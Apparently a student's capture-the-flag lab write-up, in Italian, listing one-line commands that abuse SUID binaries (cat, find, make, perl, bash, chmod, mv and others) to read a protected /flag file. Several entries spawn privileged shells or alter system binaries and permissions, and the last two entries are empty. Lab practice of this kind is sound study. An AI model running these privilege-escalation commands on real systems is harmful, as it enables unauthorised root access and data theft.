# Shellcode Exercises

## Esercizio 1 cat
```
cat /flag
```

## Esercizio 2 more
```
more /flag
```

## Esercizio 3 less
```
less /flag
```

## Esercizio 4 tail
```
tail /flag
```

## Esercizio 5 head
```
head /flag
```

## Esercizio 6 sort
```
sort /flag
```

## Esercizio 7 vim
```
vim /flag
```

## Esercizio 8 emacs
si apre emacs 
si digita `Ctrl + x` e poi `Ctrl + f`
```
flag
```

## Esercizio 9 nano
```
nano /flag
```

## Esercizio 10 rev 
```
rev /flag | rev
```

## Esercizio 11 od
```
od -a /flag
```

## Esercizio 12 hd
```
hd /flag
```

## Esercizio 13 xxd
```
xxd /flag
```

## Esercizio 14 base32
```
base32 /flag | base32 -d
```

## Esercizio 15 base64
```
base64 /flag | base64 -d
```

## Esercizio 16 split
```
split /flag
cat xaa
```

## Esercizio 17 gzip
```
gzip /flag -f -t
```

## Esercizio 18 bzip2
```
bzip2 -c /flag | bzip2 -d 
```

## Esercizio 19 zip 
```
zip test.zip /flag
cat test.zip
```

## Esercizio 20 tar
```
tar -cf test.tar /flag
cat test.tar
```

## Esercizio 21 ar
```
F=$(mktemp -u) && ar r “$F” /flag && cat “$F”
```

## Esercizio 22 cpio
```
find /flag | cpio -o > flag.cpioio && cat flag.cpioio
```

## Esercizio 23 genisoimage
```
genisoimage -sort /flag
```

## Esercizio 24 env
```
env cat /flag
```

## Esercizio 25 find
```
find . -exec /bin/sh -p\;
#cat /flag
```

## Esercizio 26 make
```
com='cat /flag'
make -s --eval=$'x\n\t-'"$com"
```

## Esercizio 27 nice
```
nice cat /flag
```

## Esercizio 28 timeout
```
timeout 1 cat /flag
```

## Esercizio 29 stdbuf
```
stdbuf -i0 cat /flag
```

## Esercizio 30 setarch
```
setarch $(arch) cat /flag
```

## Esercizio 31 watch 
```
watch -x cat /flag
```

## Esercizio 32 socat
```
socat -u /flag -
```

## Esercizio 33 whiptail 
```
whiptail --textbox /flag 10 30
```

## Esercizio 34 awk
```
awk "//" /flag
```

## Esercizio 35 sed
```
sed '' /flag
```

## Esercizio 36 ed
```
ed /flag
> p
```

## Esercizio 37 chown
```
chown hacker /flag 
cat /flag
```

## Esercizio 38 chmod
```
chmod 777 /flag
cat /flag
```

## Esercizio 39 cp
```
cp --no-preserve-all /flag ./file
cat file
```

## Esercizio 40 mv
```
mv /bin/cat /bin/mv
/challenge/babysuid_level40
mv /flag
```

## Esercizio 41 perl
```
perl -pe 'END {close ARGV}' /flag
```

## Esercizio 42 python
```
python /flag 
```

## Esercizio 43 ruby
```
echo “puts File.read(‘/flag’)” >> a.rb && ruby a.rb 
```

## Esercizio 44 bash
```
bash -p 
root# cat /flag 
```

## Esercizio 45 date 
```
date -f /flag
```

## Esercizio 46 dmesg
```
dmesg -F /flag
```

## Esercizio 47 wc
```
wc --files0-from=/flag
```

## Esercizio 48 gcc
```
gcc -x c -E /flag 
```

## Esercizio 49 as 
```
as /flag
```

## Esercizio 50 wget 
```
```

## Esercizio 51
```
```